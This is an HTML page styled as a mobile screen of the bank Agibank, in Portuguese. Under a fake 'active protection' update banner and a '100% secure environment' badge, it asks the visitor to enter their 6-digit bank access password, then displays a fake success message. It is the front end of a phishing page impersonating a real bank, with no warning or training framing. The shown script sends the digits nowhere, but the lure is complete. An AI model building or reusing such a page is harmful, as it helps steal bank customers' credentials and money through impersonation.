<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Agibank - Segurança</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
        
        :root {
            --agi-blue: #002D51;
            --agi-green: #29D381;
            --agi-light-gray: #F4F7F9;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: #e5e7eb;
            margin: 0;
            display: flex;
            justify-content: center;
            min-height: 100vh;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }

        .phone-container {
            width: 100%;
            max-width: 450px;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .agi-bg-blue { background-color: var(--agi-blue); }
        .agi-text-blue { color: var(--agi-blue); }
        .agi-bg-green { background-color: var(--agi-green); }
        .agi-text-green { color: var(--agi-green); }

        .dot-container {
            display: flex;
            justify-content: space-between;
            gap: 10px;
            margin: 30px 0;
        }

        .dot-field {
            flex: 1;
            height: 60px;
            background-color: var(--agi-light-gray);
            border-radius: 12px;
            border: 2px solid transparent;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            font-weight: 700;
            color: var(--agi-blue);
            transition: all 0.2s ease;
        }

        .dot-field.active {
            border-color: var(--agi-green);
            background-color: #fff;
            box-shadow: 0 4px 12px rgba(41, 211, 129, 0.1);
        }

        #hidden-input {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            left: -100%;
        }

        .btn-agi {
            background-color: var(--agi-green);
            color: var(--agi-blue);
            font-weight: 700;
            padding: 18px;
            width: 100%;
            border-radius: 16px;
            transition: all 0.3s;
            font-size: 16px;
        }

        .btn-agi:disabled {
            background-color: #d1d5db;
            color: #9ca3af;
            cursor: not-allowed;
        }

        .update-card {
            background: linear-gradient(135deg, #002D51 0%, #004a85 100%);
            border-radius: 20px;
            padding: 20px;
            color: white;
            margin-bottom: 30px;
        }

        .pulse {
            animation: pulse-animation 2s infinite;
        }

        @keyframes pulse-animation {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.05); opacity: 0.8; }
            100% { transform: scale(1); opacity: 1; }
        }
    </style>
</head>
<body onclick="focusInput()">

    <div class="phone-container">
        <!-- Status Bar -->
        <div class="px-6 py-2 flex justify-between items-center text-[12px] font-bold text-gray-400">
            <span>12:45</span>
            <div class="flex gap-1.5">
                <i data-lucide="signal" class="w-3.5 h-3.5"></i>
                <i data-lucide="wifi" class="w-3.5 h-3.5"></i>
                <i data-lucide="battery" class="w-3.5 h-3.5"></i>
            </div>
        </div>

        <!-- Header -->
        <div class="p-4 flex items-center">
            <button class="p-2 bg-gray-100 rounded-full">
                <i data-lucide="chevron-left" class="w-6 h-6 agi-text-blue"></i>
            </button>
            <div class="flex-grow flex justify-center pr-10">
                <span class="agi-text-blue font-black text-2xl tracking-tight">agi</span>
            </div>
        </div>

        <!-- Main Content -->
        <div class="flex-grow px-6 pt-6">
            <div class="update-card shadow-lg">
                <div class="flex items-start gap-4">
                    <div class="bg-white/20 p-3 rounded-xl">
                        <i data-lucide="shield-check" class="w-8 h-8 text-white"></i>
                    </div>
                    <div>
                        <h2 class="font-bold text-lg">Proteção Ativa</h2>
                        <p class="text-white/80 text-xs">Mantenha seu aparelho seguro atualizando suas credenciais de acesso.</p>
                    </div>
                </div>
            </div>

            <h1 class="text-2xl font-bold agi-text-blue leading-tight">Confirmar Senha</h1>
            <p class="text-gray-500 text-sm mt-2">
                Digite sua senha de acesso de <span class="font-bold">6 dígitos</span> para validar a segurança do dispositivo.
            </p>

            <div class="relative">
                <div class="dot-container" id="dot-wrap">
                    <div class="dot-field" id="dot-0"></div>
                    <div class="dot-field" id="dot-1"></div>
                    <div class="dot-field" id="dot-2"></div>
                    <div class="dot-field" id="dot-3"></div>
                    <div class="dot-field" id="dot-4"></div>
                    <div class="dot-field" id="dot-5"></div>
                </div>

                <input 
                    type="number" 
                    id="hidden-input" 
                    inputmode="numeric" 
                    pattern="[0-9]*" 
                    maxlength="6"
                    autocomplete="off"
                >
            </div>

            <div class="mt-8 flex items-center justify-center gap-2 text-gray-400">
                <i data-lucide="lock" class="w-4 h-4"></i>
                <span class="text-[11px] uppercase font-bold tracking-widest">Ambiente 100% Seguro</span>
            </div>
        </div>

        <!-- Footer -->
        <div class="p-6">
            <button id="confirm-btn" disabled class="btn-agi shadow-md active:scale-[0.98]">
                VALIDAR ACESSO
            </button>
            <p class="text-center text-sm text-gray-500 mt-6 font-medium">
                Precisa de ajuda? <span class="agi-text-green font-bold">Fale conosco</span>
            </p>
        </div>
    </div>

    <script>
        // Inicialização de ícones
        lucide.createIcons();
        
        const input = document.getElementById('hidden-input');
        const dots = Array.from({length: 6}, (_, i) => document.getElementById(`dot-${i}`));
        const btn = document.getElementById('confirm-btn');

        function focusInput() {
            input.focus();
        }

        input.addEventListener('input', (e) => {
            let val = e.target.value;
            
            // Forçar apenas números e limite de 6
            val = val.replace(/\D/g, '').slice(0, 6);
            input.value = val;

            dots.forEach((dot, index) => {
                if (index < val.length) {
                    dot.innerText = val[index]; // Dígito VISÍVEL
                    dot.classList.add('active');
                } else {
                    dot.innerText = '';
                    dot.classList.remove('active');
                }
            });

            btn.disabled = val.length !== 6;
        });

        // Bloqueia teclas especiais no input numérico
        input.addEventListener('keydown', (e) => {
            if (["e", "E", "+", "-", ".", ","].includes(e.key)) {
                e.preventDefault();
            }
        });

        btn.addEventListener('click', () => {
            const originalContent = btn.innerHTML;
            btn.innerHTML = '<div class="flex items-center justify-center gap-2"><i data-lucide="loader-2" class="w-5 h-5 animate-spin"></i> PROCESSANDO...</div>';
            lucide.createIcons();
            btn.disabled = true;

            setTimeout(() => {
                btn.style.backgroundColor = '#002D51';
                btn.style.color = '#ffffff';
                btn.innerHTML = '<div class="flex items-center justify-center gap-2"><i data-lucide="check-circle" class="w-5 h-5"></i> SUCESSO</div>';
                lucide.createIcons();
                
                // Redirecionamento ou feedback final após sucesso
                setTimeout(() => {
                    btn.innerHTML = "APARELHO ATUALIZADO";
                }, 1500);
            }, 2000);
        });

        // Foco automático ao carregar
        window.onload = () => {
            setTimeout(focusInput, 500);
        };
    </script>
</body>
</html>
